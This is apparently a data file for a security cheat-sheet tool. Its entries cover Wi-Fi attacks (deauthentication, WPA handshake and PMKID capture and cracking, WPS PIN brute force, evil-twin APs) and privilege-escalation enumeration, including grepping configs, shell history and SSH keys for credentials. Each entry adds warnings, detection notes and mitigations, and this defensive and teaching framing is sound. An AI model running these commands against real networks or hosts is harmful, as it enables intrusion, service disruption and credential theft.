 {"id":"wifi-monitor-manual","level":"intermediate","requires":{"elevation":true},"updated":"2026-07","cat":"Wireless Auditing","title":"Enable monitor mode (manual iw)","desc":"Switch an interface to monitor mode with iw/ip when airmon-ng is unavailable; macOS uses tcpdump -I.","danger":"Requires root and drops the interface offline; authorized audits only.","team":"red","tags":["wireless","recon","linux"],"attack":["T1040"],"detect":"No radio-side signature; host telemetry showing an interface set to type monitor or a tcpdump -I process is the tell.","mitigate":"Limit local admin, and use WPA3-SAE + 802.11w so sniffed frames yield nothing crackable.","code":{"linux":"sudo ip link set {{IFACE:wlan0}} down\nsudo iw dev {{IFACE:wlan0}} set type monitor\nsudo ip link set {{IFACE:wlan0}} up","mac":"sudo tcpdump -I -i en0 -w /tmp/wifi.pcap"}},
 {"id":"wifi-airodump-survey","level":"intermediate","requires":{"elevation":true,"tool":"airodump-ng"},"updated":"2026-07","related":["wifi-airodump-capture","wifi-deauth-aireplay"],"cat":"Wireless Auditing","title":"Live AP/client survey (airodump-ng)","desc":"Sweep all channels with airodump-ng to map APs and associated clients before targeting your test AP.","danger":"Requires monitor mode and root; captures traffic from all nearby networks, so scope to authorized testing.","team":"red","tags":["wireless","recon","scanning"],"attack":["T1040"],"detect":"Passive capture is invisible over the air; correlated deauth/probe activity from the same session is what WIDS actually flags.","mitigate":"Deploy WIPS to baseline expected APs/clients and alert on unknown monitors staging follow-on attacks.","code":{"linux":"sudo airodump-ng {{IFACE:wlan0mon}}"}},
 {"id":"wifi-airodump-capture","level":"intermediate","requires":{"elevation":true,"tool":"airodump-ng"},"updated":"2026-07","related":["wifi-deauth-aireplay","wifi-verify-handshake"],"cat":"Wireless Auditing","title":"Capture a WPA handshake (airodump-ng)","desc":"Lock airodump-ng to one BSSID/channel and write a capture to grab the 4-way EAPOL handshake on your own AP.","danger":"Root + monitor mode; targets a single AP by BSSID — use only your own or explicitly authorized network.","team":"red","tags":["wireless","password","linux"],"attack":["T1040"],"detect":"Handshake capture is passive; the paired deauth used to speed it up (see aireplay entry) is the detectable signal in WIDS logs.","mitigate":"WPA3-SAE resists offline handshake cracking; on WPA2 enforce long random passphrases and enable 802.11w (PMF).","code":{"linux":"sudo airodump-ng --bssid {{BSSID:AA:BB:CC:DD:EE:FF}} -c {{CHANNEL:6}} -w handshake {{IFACE:wlan0mon}}","mac":"sudo tcpdump -I -i en0 -c 4000 -w handshake.pcap"}},
 {"id":"wifi-deauth-aireplay","level":"intermediate","requires":{"elevation":true,"tool":"aireplay-ng"},"updated":"2026-07","related":["wifi-airodump-capture","wifi-verify-handshake"],"cat":"Wireless Auditing","title":"Deauthenticate a client (aireplay-ng)","desc":"Send 802.11 deauth frames with aireplay-ng to force a client to reconnect and re-emit the handshake.","danger":"Actively disrupts connectivity (denial of service) and is illegal against networks you do not own; written authorization required.","team":"red","tags":["wireless","exploitation","linux"],"attack":["T1498"],"detect":"Bursts of type/subtype 0x0C deauth frames, especially spoofing the AP's BSSID, trigger WIDS deauth-flood alerts and show as sudden mass client drops.","mitigate":"Enable 802.11w Protected Management Frames (mandatory in WPA3) so forged deauth frames are rejected.","code":{"linux":"sudo aireplay-ng --deauth {{COUNT:5}} -a {{BSSID:AA:BB:CC:DD:EE:FF}} -c {{CLIENT:11:22:33:44:55:66}} {{IFACE:wlan0mon}}"}},
 {"id":"wifi-verify-handshake","level":"intermediate","requires":{"tool":"aircrack-ng"},"updated":"2026-07","related":["wifi-crack-aircrack","wifi-convert-hashcat"],"cat":"Wireless Auditing","title":"Verify a capture contains a handshake","desc":"Confirm EAPOL messages are present before cracking, using aircrack-ng's summary or a tshark filter.","danger":"Read-only on your own capture file; still audit only data you were authorized to collect.","team":"red","tags":["wireless","password","triage"],"attack":["T1040"],"detect":"Offline file inspection; nothing observable on the network.","mitigate":"N/A defensively — value is in confirming that PMF/WPA3 prevented a usable handshake from ever being captured.","code":{"linux":"aircrack-ng handshake-01.cap\ntshark -r handshake-01.cap -Y eapol"}},
 {"id":"wifi-crack-aircrack","level":"intermediate","requires":{"tool":"aircrack-ng"},"updated":"2026-07","cat":"Wireless Auditing","title":"Crack WPA/WPA2 handshake (aircrack-ng)","desc":"Run a dictionary attack with aircrack-ng against a handshake captured from your own AP.","danger":"Offline password attack against a passphrase you must own or be authorized to test; illegal otherwise.","team":"red","tags":["wireless","password","linux"],"attack":["T1110.002"],"detect":"Fully offline and undetectable on the wire; defenders can only assume any captured handshake is under attack.","mitigate":"Use 15+ char random passphrases and migrate to WPA3-SAE, which is not vulnerable to offline dictionary attacks on the handshake.","code":{"linux":"aircrack-ng -w {{WORDLIST:/usr/share/wordlists/rockyou.txt}} -b {{BSSID:AA:BB:CC:DD:EE:FF}} handshake-01.cap"}},
 {"id":"wifi-convert-hashcat","level":"intermediate","requires":{"tool":"hcxpcapngtool"},"updated":"2026-07","related":["wifi-crack-hashcat"],"cat":"Wireless Auditing","title":"Convert capture to hashcat 22000","desc":"Convert a .cap/.pcapng to the hashcat WPA-PBKDF2/PMKID mode 22000 format using hcxpcapngtool (hcxtools).","danger":"Prepares captured handshake material for cracking; only process data from authorized audits.","team":"red","tags":["wireless","password","linux"],"attack":["T1110.002"],"detect":"Offline conversion, no network signature.","mitigate":"WPA3-SAE and long random passphrases render the resulting 22000 hash impractical to crack.","code":{"linux":"hcxpcapngtool -o {{OUT:hash.22000}} handshake-01.cap"}},
 {"id":"wifi-crack-hashcat","level":"intermediate","requires":{"tool":"hashcat"},"updated":"2026-07","related":["pw-hashcat-modes","pw-hashcat-show"],"cat":"Wireless Auditing","title":"GPU-crack WPA hash (hashcat -m 22000)","desc":"Dictionary/mask attack a converted WPA hash with hashcat mode 22000 (needs hashcat + GPU driver).","danger":"High-speed offline password cracking; run only against your own captured hashes or with written authorization.","team":"red","tags":["wireless","password","linux"],"attack":["T1110.002"],"detect":"Offline; not visible to network defenders.","mitigate":"Enforce entropy the wordlist/masks cannot cover (long random passphrases) and adopt WPA3-SAE.","code":{"linux":"hashcat -m 22000 {{HASH:hash.22000}} {{WORDLIST:/usr/share/wordlists/rockyou.txt}}"}},
 {"id":"wifi-pmkid-hcxdumptool","level":"intermediate","requires":{"elevation":true,"tool":"hcxdumptool"},"updated":"2026-07","related":["wifi-convert-hashcat","wifi-crack-hashcat"],"cat":"Wireless Auditing","title":"Capture PMKID (hcxdumptool)","desc":"Client-less PMKID capture against your own AP with hcxdumptool (flag syntax varies by version; check --help).","danger":"Root + radio transmit; actively probes APs, so restrict to networks you own or are authorized to audit.","team":"red","tags":["wireless","password","linux"],"attack":["T1040"],"detect":"Association/EAPOL requests to APs without a real client appear in AP logs and WIDS as anomalous PMKID solicitations.","mitigate":"WPA3-SAE does not expose a crackable PMKID; on WPA2 use long random passphrases and disable roaming features that leak PMKID where feasible.","code":{"linux":"sudo hcxdumptool -i {{IFACE:wlan0}} -w pmkid.pcapng"}},
 {"id":"wifi-wash-wps-scan","level":"intermediate","requires":{"elevation":true,"tool":"wash"},"updated":"2026-07","related":["wifi-reaver-wps","wifi-bully-wps"],"cat":"Wireless Auditing","title":"Find WPS-enabled APs (wash)","desc":"Identify nearby APs with WPS enabled and their lock state using wash (reaver suite).","danger":"Root + monitor mode; recon of third-party WPS state is restricted — scope to authorized targets.","team":"red","tags":["wireless","recon","linux"],"attack":["T1595"],"detect":"Passive WPS-IE parsing is invisible over the air; follow-on reaver/bully PIN attempts are what logs capture.","mitigate":"Disable WPS entirely on all APs — it is the precondition for PIN brute-force attacks.","code":{"linux":"sudo wash -i {{IFACE:wlan0mon}}"}},
 {"id":"wifi-reaver-wps","level":"intermediate","requires":{"elevation":true,"tool":"reaver"},"updated":"2026-07","cat":"Wireless Auditing","title":"WPS PIN attack (reaver)","desc":"Brute-force / Pixie-Dust a WPS PIN with reaver to recover the WPA passphrase on your own AP.","danger":"Actively hammers the AP's WPS registrar and can lock or crash it; only against APs you own or are authorized to test.","team":"red","tags":["wireless","password","linux"],"attack":["T1110"],"detect":"Repeated WPS EAP registrar attempts from one MAC appear in AP logs and trip WPS lockout counters.","mitigate":"Disable WPS; if unavoidable, enable AP-side WPS lockout after failed attempts and patch Pixie-Dust-vulnerable firmware.","code":{"linux":"sudo reaver -i {{IFACE:wlan0mon}} -b {{BSSID:AA:BB:CC:DD:EE:FF}} -vv"}},
 {"id":"wifi-bully-wps","level":"intermediate","requires":{"elevation":true,"tool":"bully"},"updated":"2026-07","cat":"Wireless Auditing","title":"WPS PIN attack (bully)","desc":"Alternative WPS PIN brute-force with bully, often more robust against flaky registrars.","danger":"Actively attacks the WPS registrar and may lock the AP; authorized targets only.","team":"red","tags":["wireless","password","linux"],"attack":["T1110"],"detect":"Same WPS registrar-attempt bursts and lockout events as reaver in AP logs.","mitigate":"Turn off WPS across the estate and enforce registrar lockout/rate-limiting on any device that must keep it.","code":{"linux":"sudo bully {{IFACE:wlan0mon}} -b {{BSSID:AA:BB:CC:DD:EE:FF}} -v 3"}},
 {"id":"wifi-wifite-auto","level":"intermediate","requires":{"elevation":true,"tool":"wifite"},"updated":"2026-07","cat":"Wireless Auditing","title":"Automated audit (wifite)","desc":"Run wifite to orchestrate scanning, handshake/PMKID capture, WPS and cracking against selected targets.","danger":"Automates deauth and active attacks against every selected AP; only launch against networks in your authorized scope.","team":"red","tags":["wireless","exploitation","linux"],"attack":["T1110.002"],"detect":"Its deauth floods and WPS attempts generate the same WIDS alerts as the individual tools it drives.","mitigate":"WPA3-SAE + PMF + disabled WPS remove almost every attack path wifite automates.","code":{"linux":"sudo wifite"}},
 {"id":"wifi-kismet-passive","level":"intermediate","requires":{"elevation":true,"tool":"kismet"},"updated":"2026-07","cat":"Wireless Auditing","title":"Passive wardriving / detection (kismet)","desc":"Run kismet for passive multi-band AP/client discovery, logging and rogue-device detection.","danger":"Root; passively logs all nearby wireless devices — handle collected data per your authorization and privacy rules.","team":"red","tags":["wireless","recon","detection"],"attack":["T1040"],"detect":"Receive-only, so undetectable on the air; useful defensively too as a WIDS to spot others' deauth/rogue activity.","mitigate":"Also deploy kismet defensively to baseline your RF environment and alert on unexpected APs and monitors.","code":{"linux":"sudo kismet -c {{IFACE:wlan0}}"}},
 {"id":"wifi-mac-spoof","level":"intermediate","requires":{"elevation":true},"updated":"2026-07","cat":"Wireless Auditing","title":"Randomize adapter MAC (macchanger)","desc":"Change the Wi-Fi adapter's MAC with macchanger (Linux) or ifconfig ether (macOS) for privacy or MAC-filter testing.","danger":"Root; impersonating a MAC to bypass access controls on networks you don't own is prohibited — authorized testing only.","team":"red","tags":["wireless","post-ex","linux"],"attack":["T1036"],"detect":"Duplicate MACs or OUI/vendor mismatches versus expected hardware show up in DHCP and switch/AP MAC tables.","mitigate":"Do not rely on MAC filtering as a control; use 802.1X/WPA-Enterprise for real device authentication.","code":{"linux":"sudo ip link set {{IFACE:wlan0}} down\nsudo macchanger -r {{IFACE:wlan0}}\nsudo ip link set {{IFACE:wlan0}} up","mac":"sudo ifconfig en0 ether {{MAC:00:11:22:33:44:55}}"}},
 {"id":"wifi-set-channel","level":"intermediate","requires":{"elevation":true},"cat":"Wireless Auditing","title":"Lock monitor interface to a channel","desc":"Pin a monitor-mode interface to a specific channel so captures aren't lost to channel hopping.","danger":"Requires root; changes radio state on the local adapter.","tags":["wireless","linux","reference"],"code":{"linux":"sudo iw dev {{IFACE:wlan0mon}} set channel {{CHANNEL:6}}"}},
 {"id":"wifi-rogue-ap-catalog","level":"intermediate","requires":{"elevation":true},"updated":"2026-07","cat":"Wireless Auditing","title":"Rogue AP / evil-twin tooling (catalog)","desc":"Reference for adversary-in-the-middle AP tooling (airbase-ng, hostapd) used in lab AitM tests; practice on HackTheBox/TryHackMe wireless ranges, not production RF.","danger":"Standing up a look-alike AP to intercept clients is a serious AitM attack — build only in an isolated lab or with explicit written authorization.","team":"red","tags":["wireless","exploitation","teaching"],"attack":["T1557"],"detect":"WIDS flags a second BSSID advertising a known SSID, unexpected channel/signal for that SSID, and clients associating to an unauthorized AP MAC.","mitigate":"Use WPA3/802.1X with server-certificate validation so clients reject rogue APs; deploy WIPS to alert on and contain evil twins.","code":{"linux":"sudo airbase-ng -e \"{{SSID:TestLab-AP}}\" -c {{CHANNEL:6}} {{IFACE:wlan0mon}}"}},
 {"id":"wifi-deauth-detect","level":"intermediate","requires":{"elevation":true},"cat":"Wireless Auditing","title":"Detect deauth/disassoc floods","desc":"Blue-team: watch for spoofed 802.11 deauthentication frames with a tshark monitor-mode filter.","danger":"Requires root and monitor mode; deploy on sensors you own within your own RF space.","team":"blue","tags":["wireless","detection","incident-response"],"attack":["T1498"],"detect":"High counts of type/subtype 0x0C (deauth) or 0x0A (disassoc) frames — especially spoofing the AP BSSID — indicate a deauth flood driving handshake capture.","mitigate":"Enable 802.11w PMF / WPA3 so forged management frames are dropped, and route sensor alerts into your SIEM.","code":{"linux":"sudo tshark -i {{IFACE:wlan0mon}} -Y \"wlan.fc.type_subtype == 0x0c\""}},
 {"id":"wifi-rogue-ap-detect","level":"intermediate","cat":"Wireless Auditing","title":"Spot evil-twin / duplicate SSIDs","desc":"Blue-team: list nearby APs sorted to reveal one SSID advertised by multiple/unexpected BSSIDs.","danger":"Read-only survey; still limit monitoring to your own RF environment.","team":"blue","tags":["wireless","detection","incident-response"],"attack":["T1557"],"detect":"A trusted SSID appearing under two BSSIDs, an unfamiliar OUI, or an anomalously strong signal for a known network points to a rogue/evil-twin AP.","mitigate":"Maintain an authorized-BSSID allowlist in WIPS, alert on deviations, and require certificate-validated WPA3/802.1X so clients won't trust the impostor.","code":{"linux":"nmcli -f SSID,BSSID,CHAN,SIGNAL dev wifi list | sort"}},

/* ================= PRIVILEGE-ESCALATION ENUMERATION ================= */
 {"id":"pe-linpeas","level":"advanced","updated":"2026-07","related":["pe-suid-sgid","pe-sudo-l","pe-cron-enum"],"cat":"Privilege-Escalation Enumeration","title":"LinPEAS / macOS PEAS all-in-one audit","desc":"Run the LinPEAS (PEASS-ng) script to auto-enumerate local privilege-escalation paths; results to a file.","team":"red","tags":["privesc","enumeration","cross-platform"],"attack":["T1082","T1083"],"detect":"auditd/EDR sees one process spawning hundreds of read-only recon commands (id, find, getcap, ls -la on system dirs) in seconds; the script name 'linpeas' in process args and a large output file appearing in /tmp or /dev/shm.","mitigate":"Deploy execution logging (auditd execve, Sysmon-for-Linux) and alert on mass enumeration; restrict interactive shells; keep least-privilege so findings are empty.","danger":"Authorized assessments only. Noisy and unmistakably offensive; touches the whole filesystem and may trip EDR. Never run on systems you do not own or have written scope for.","code":{"linux":"# Assumes linpeas.sh is already on disk (offline kit)\nchmod +x linpeas.sh\n./linpeas.sh -a 2>&1 | tee \"/tmp/linpeas_$(date +%F_%H%M).txt\"","mac":"# The same PEASS-ng script includes macOS checks\nchmod +x linpeas.sh\n./linpeas.sh -a 2>&1 | tee \"/tmp/linpeas_$(date +%F_%H%M).txt\""}},
 {"id":"pe-winpeas","level":"advanced","updated":"2026-07","related":["pe-whoami-priv","pe-unquoted-service-path","pe-stored-creds-windows"],"cat":"Privilege-Escalation Enumeration","title":"WinPEAS local privesc audit","desc":"Run WinPEAS (PEASS-ng) to enumerate Windows privilege-escalation vectors: services, tokens, creds, registry.","team":"red","tags":["privesc","enumeration","windows"],"attack":["T1082","T1083"],"detect":"Sysmon/EDR flags the winPEAS binary or .bat, rapid-fire reg/whoami/sc queries, and CIM/WMI service enumeration from one short-lived process; unusual output redirection to a text file.","mitigate":"Application allow-listing (WDAC/AppLocker) blocks the unsigned binary; enable Sysmon process + registry logging; enforce least privilege and patch to close the vectors it reports.","danger":"Authorized assessments only. Unsigned offensive tool, high-signal to EDR. Do not deploy outside a written engagement scope.","code":{"ps":"# winPEASx64.exe already staged (offline kit)\n.\\winPEASx64.exe log 2>&1 | Tee-Object -FilePath \".\\winpeas.txt\"","cmd":"winPEASx64.exe log > winpeas.txt 2>&1\ntype winpeas.txt"}},
 {"id":"pe-suid-sgid","level":"advanced","updated":"2026-07","related":["pe-capabilities"],"cat":"Privilege-Escalation Enumeration","title":"Find SUID / SGID binaries","desc":"List setuid/setgid executables to cross-reference against GTFOBins for privilege escalation.","team":"red","tags":["privesc","enumeration","cross-platform"],"attack":["T1548.001","T1083"],"detect":"Filesystem-wide 'find -perm -4000' walk generates a burst of getattr/open syscalls; auditd file-scan rules and EDR flag full-tree traversal by a non-service user.","mitigate":"Audit and minimise the SUID set (dpkg-statoverride / remove the bit where not needed); mount user-writable filesystems nosuid; alert on new SUID files.","danger":"Read-only enumeration, but a precursor to escalation. Authorized use only.","code":{"linux":"find / -xdev -type f \\( -perm -4000 -o -perm -2000 \\) -exec ls -la {} \\; 2>/dev/null","mac":"find / -xdev -type f \\( -perm -4000 -o -perm -2000 \\) -exec ls -la {} \\; 2>/dev/null"}},
 {"id":"pe-capabilities","level":"advanced","updated":"2026-07","cat":"Privilege-Escalation Enumeration","title":"Enumerate Linux file capabilities","desc":"List binaries carrying POSIX capabilities (e.g. cap_setuid) that can grant root without the SUID bit.","team":"red","tags":["privesc","enumeration","linux"],"attack":["T1548.001"],"detect":"'getcap -r /' triggers a full-filesystem walk visible to auditd/EDR; rare for interactive users to enumerate capabilities.","mitigate":"Keep the capability inventory minimal; strip cap_setuid/cap_dac_override from unexpected binaries; monitor setcap use and new capability grants.","danger":"Read-only. Linux only (getcap is part of libcap). Authorized use only.","code":{"linux":"getcap -r / 2>/dev/null"}},
 {"id":"pe-sudo-l","level":"advanced","requires":{"elevation":true},"updated":"2026-07","related":["pe-sudo-version"],"cat":"Privilege-Escalation Enumeration","title":"List sudo rights for current user","desc":"Show which commands the current user may run via sudo; cross-check allowed binaries against GTFOBins.","team":"red","tags":["privesc","enumeration","account"],"attack":["T1548.003"],"detect":"sudo logs every invocation (including 'sudo -l') to authpriv/journal; SIEM can alert on -l enumeration or NOPASSWD entries being listed.","mitigate":"Scope sudoers tightly, avoid NOPASSWD and shell-spawning binaries; require a password; review /etc/sudoers.d regularly.","danger":"May prompt for a password and is logged. Authorized use only.","code":{"linux":"sudo -ln 2>/dev/null || sudo -l","mac":"sudo -ln 2>/dev/null || sudo -l"}},
 {"id":"pe-sudo-version","level":"advanced","requires":{"elevation":true},"updated":"2026-07","cat":"Privilege-Escalation Enumeration","title":"Check sudo version for known CVEs","desc":"Print the sudo version to match against known vulnerabilities (e.g. Baron Samedit / CVE-2021-3156).","team":"red","tags":["privesc","enumeration","reference"],"attack":["T1082"],"detect":"Benign on its own; correlate with other privesc-enumeration commands from the same session to surface intent.","mitigate":"Patch sudo promptly; track installed package versions in your vuln-management pipeline.","danger":"Read-only version banner. Authorized use only.","code":{"linux":"sudo --version | head -n1","mac":"sudo --version | head -n1"}},
 {"id":"pe-cron-enum","level":"advanced","updated":"2026-07","cat":"Privilege-Escalation Enumeration","title":"Enumerate cron jobs & writable scripts","desc":"List system and user cron entries and flag any referenced scripts a low-priv user can modify.","team":"red","tags":["privesc","enumeration","scheduling"],"attack":["T1053.003"],"detect":"Reads of /etc/crontab and /etc/cron.* plus 'crontab -l' by a normal user; alert on world-writable files invoked by root cron.","mitigate":"Ensure cron-referenced scripts are root-owned and non-writable by others; audit /etc/cron.d; use absolute paths in cron.","danger":"Read-only enumeration. Authorized use only.","code":{"linux":"crontab -l 2>/dev/null\nls -la /etc/crontab /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ 2>/dev/null\ncat /etc/crontab 2>/dev/null\nfind /etc/cron* -type f -perm -0002 2>/dev/null -exec ls -la {} \\;"}},
 {"id":"pe-systemd-writable","level":"advanced","updated":"2026-07","cat":"Privilege-Escalation Enumeration","title":"Writable systemd units & timers","desc":"Find systemd service/timer unit files or their ExecStart targets that a non-root user can edit.","team":"red","tags":["privesc","enumeration","linux"],"attack":["T1053.006","T1574.010"],"detect":"'-writable' find walks over /etc/systemd and /lib/systemd; auditd can watch those paths for read/scan and for actual writes.","mitigate":"Unit files must be root-owned and 0644; audit drop-in dirs (*.d); alert on new/edited units; run 'systemd-analyze security' to tighten services.","danger":"Read-only enumeration (find -writable is GNU/Linux). Authorized use only.","code":{"linux":"find /etc/systemd/ /lib/systemd/ /run/systemd/ -writable -type f 2>/dev/null\nsystemctl list-timers --all 2>/dev/null"}},
 {"id":"pe-path-hijack","level":"advanced","updated":"2026-07","cat":"Privilege-Escalation Enumeration","title":"Writable $PATH directory check","desc":"Flag any directory in $PATH the current user can write to (PATH-hijack / binary-planting risk).","team":"red","tags":["privesc","enumeration","cross-platform"],"attack":["T1574.007"],"detect":"Hard to see the check itself; detect the abuse — new executables appearing in PATH dirs, or privileged processes resolving binaries from user-writable locations.","mitigate":"Remove writable/relative entries (., ~) from system PATH; keep PATH dirs root-owned; use absolute paths in privileged scripts.","danger":"Read-only enumeration. Authorized use only.","code":{"linux":"IFS=:; for d in $PATH; do [ -d \"$d\" ] && [ -w \"$d\" ] && echo \"WRITABLE: $d\"; done","mac":"IFS=:; for d in $PATH; do [ -d \"$d\" ] && [ -w \"$d\" ] && echo \"WRITABLE: $d\"; done"}},
 {"id":"pe-world-writable","level":"advanced","updated":"2026-07","cat":"Privilege-Escalation Enumeration","title":"World-writable files & directories","desc":"Locate world-writable files/dirs (excluding sticky-bit temp dirs) that could enable tampering or escalation.","team":"red","tags":["privesc","enumeration","cross-platform"],"attack":["T1083"],"detect":"Full-tree 'find -perm -0002' walk visible to auditd/EDR as a mass stat sweep.","mitigate":"Tighten permissions (chmod o-w); add the sticky bit to shared dirs; baseline the filesystem and alert on new world-writable objects.","danger":"Read-only enumeration. Authorized use only.","code":{"linux":"find / -xdev -type f -perm -0002 -not -path '/proc/*' 2>/dev/null\nfind / -xdev -type d -perm -0002 ! -perm -1000 2>/dev/null","mac":"find / -xdev -type f -perm -0002 2>/dev/null\nfind / -xdev -type d -perm -0002 ! -perm -1000 2>/dev/null"}},
 {"id":"pe-kernel-version","level":"advanced","updated":"2026-07","cat":"Privilege-Escalation Enumeration","title":"Kernel version for exploit matching","desc":"Print exact kernel/build to match against known local-privesc kernel vulnerabilities.","team":"red","tags":["privesc","enumeration","reference"],"attack":["T1082"],"detect":"Benign in isolation; value comes from correlating with a broader enumeration session.","mitigate":"Keep kernels patched; track kernel build in vuln management; enable live-patching where available.","danger":"Read-only. Authorized use only.","code":{"linux":"uname -a\ncat /proc/version","mac":"uname -a\nsysctl kern.version"}},
 {"id":"pe-os-version","level":"advanced","updated":"2026-07","cat":"Privilege-Escalation Enumeration","title":"OS build & patch level","desc":"Read the OS release/build and (Windows) installed hotfixes to identify missing patches.","team":"red","tags":["privesc","enumeration","reference"],"attack":["T1082"],"detect":"Benign individually; 'systeminfo'/hotfix queries alongside other recon are a weak privesc-enumeration signal.","mitigate":"Maintain patch SLAs; centralise build/patch inventory; minimise info leaked to unprivileged users where feasible.","danger":"Read-only. Authorized use only.","code":{"ps":"Get-ComputerInfo -Property OsName,OsVersion,OsBuildNumber,WindowsProductName\nGet-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 15 HotFixID,InstalledOn","cmd":"systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"\nwmic qfe get HotFixID,InstalledOn","linux":"cat /etc/os-release","mac":"sw_vers"}},
 {"id":"pe-stored-creds-grep","level":"advanced","updated":"2026-07","cat":"Privilege-Escalation Enumeration","title":"Grep filesystem for stored credentials","desc":"Recursively search common config locations for hard-coded passwords, secrets, and tokens.","team":"red","tags":["privesc","enumeration","password"],"attack":["T1552.001"],"detect":"Recursive grep across /etc, /home, /var/www generates broad read activity; auditd file-access rules and DLP can flag bulk reads of config/secret files.","mitigate":"Move secrets to a vault/secret manager; restrict config file perms; rotate any credential that ever sat in plaintext on disk.","danger":"Read-only, but discloses credentials. Authorized use only.","code":{"linux":"grep -rniI --include='*.conf' --include='*.cnf' --include='*.ini' --include='*.xml' --include='*.yml' --include='*.yaml' --include='*.env' --include='*.php' -e password -e passwd -e secret -e api_key /etc /home /var/www /opt 2>/dev/null | head -n 50","mac":"grep -rniI --include='*.conf' --include='*.cnf' --include='*.ini' --include='*.xml' --include='*.yml' --include='*.yaml' --include='*.env' --include='*.php' -e password -e passwd -e secret -e api_key /etc /Users /Library 2>/dev/null | head -n 50"}},
 {"id":"pe-history-creds","level":"advanced","updated":"2026-07","cat":"Privilege-Escalation Enumeration","title":"Harvest secrets from shell history","desc":"Scan bash/zsh history for passwords, tokens, and credentialed one-liners.","team":"red","tags":["privesc","enumeration","password"],"attack":["T1552.003"],"detect":"Reads of ~/.bash_history / ~/.zsh_history; watch for cross-user history access (another user's home) which requires elevated rights.","mitigate":"Avoid secrets on the command line; set HISTIGNORE / HISTCONTROL; keep history files 0600; educate users to use env files or vaults.","danger":"Read-only, but discloses credentials. Authorized use only.","code":{"linux":"cat ~/.bash_history ~/.zsh_history 2>/dev/null | grep -iE 'pass|passwd|secret|token|api[_-]?key|mysql|psql|ssh|curl.*-u' | sort -u","mac":"cat ~/.zsh_history ~/.bash_history 2>/dev/null | grep -iE 'pass|passwd|secret|token|api[_-]?key|mysql|psql|ssh|curl.*-u' | sort -u"}},
 {"id":"pe-ssh-keys","level":"advanced","updated":"2026-07","cat":"Privilege-Escalation Enumeration","title":"Locate private SSH keys","desc":"Find readable private keys usable for lateral movement or escalation to other accounts/hosts.","team":"red","tags":["privesc","enumeration","password"],"attack":["T1552.004"],"detect":"Filesystem-wide search for id_rsa/*.pem and reads outside the user's own ~/.ssh; auditd can watch .ssh directories for cross-user access.","mitigate":"Passphrase-protect keys, keep them 0600 and owner-scoped; prefer short-lived certs/agents; rotate exposed keys immediately.","danger":"Read-only, but exposes authentication material. Authorized use only.","code":{"linux":"find / -xdev \\( -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' -o -name '*.pem' \\) 2>/dev/null\ngrep -rlI 'PRIVATE KEY' /home /root /etc 2>/dev/null","mac":"find / -xdev \\( -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' -o -name '*.pem' \\) 2>/dev/null\ngrep -rlI 'PRIVATE KEY' /Users 2>/dev/null"}},
 {"id":"pe-nfs-rootsquash","level":"advanced","updated":"2026-07","cat":"Privilege-Escalation Enumeration","title":"Check NFS exports for no_root_squash","desc":"Inspect NFS exports for no_root_squash, which lets a remote root write setuid files. Uses showmount (nfs-common).","team":"red","tags":["privesc","enumeration","network"],"attack":["T1083"],"detect":"Reads of /etc/exports and 'showmount -e' RPC queries to the NFS server; monitor for unexpected export enumeration.","mitigate":"Use root_squash on all exports; restrict exports by host/subnet and read-only where possible; mount client shares nosuid.","danger":"Read-only enumeration. Authorized use only.","code":{"linux":"cat /etc/exports 2>/dev/null\nshowmount -e localhost 2>/dev/null\nshowmount -e {{NFS_HOST:127.0.0.1}} 2>/dev/null"}},
 {"id":"pe-docker-group","level":"advanced","updated":"2026-07","cat":"Privilege-Escalation Enumeration","title":"Check for privesc group memberships","desc":"Determine if the current user is in docker/lxd/disk or other groups that trivially grant root.","team":"red","tags":["privesc","enumeration","account"],"attack":["T1069.001"],"detect":"'id'/'groups' calls are common, but subsequent 'docker run -v /:/host' or lxd image import is a strong escalation indicator to watch.","mitigate":"Treat docker/lxd/disk group membership as root-equivalent — restrict it; use rootless containers; audit group changes.","danger":"Read-only enumeration. Authorized use only.","code":{"linux":"id\ngroups\nfor g in docker lxd lxc disk adm sudo wheel; do getent group \"$g\" 2>/dev/null; done"}},
 {"id":"pe-whoami-priv","level":"advanced","updated":"2026-07","related":["pe-unquoted-service-path","pe-alwaysinstallelevated"],"cat":"Privilege-Escalation Enumeration","title":"Enumerate Windows token privileges","desc":"List the current token's privileges (SeImpersonate, SeBackup, SeDebug) that enable escalation techniques.","team":"red","tags":["privesc","enumeration","windows"],"attack":["T1134"],"detect":"'whoami /priv' and /all are quick and quiet; correlate with a follow-on service/token-abuse process in Sysmon.","mitigate":"Remove dangerous privileges from service accounts; avoid running services as accounts holding SeImpersonate; monitor for potato-style token abuse.","danger":"Read-only enumeration. Authorized use only.","code":{"ps":"whoami /priv\nwhoami /groups","cmd":"whoami /priv\nwhoami /groups"}},
 {"id":"pe-unquoted-service-path","level":"advanced","updated":"2026-07","cat":"Privilege-Escalation Enumeration","title":"Find unquoted service paths","desc":"List services whose ImagePath has spaces and no quotes, allowing binary planting in a parent directory.","team":"red","tags":["privesc","enumeration","windows"],"attack":["T1574.009"],"detect":"CIM/WMI Win32_Service enumeration from a non-admin process; the real signal is a new .exe written to C:\\Program.exe or a service parent dir.","mitigate":"Quote all service ImagePaths; restrict write access to service install directories; audit for unquoted paths at build time.","danger":"Read-only enumeration. Authorized use only.","code":{"ps":"Get-CimInstance Win32_Service |\n  Where-Object { $_.PathName -match ' ' -and $_.PathName -notmatch '^\\\"' -and $_.PathName -notmatch '^[A-Za-z]:\\\\Windows' } |\n  Select-Object Name, StartMode, StartName, PathName | Format-List"}},
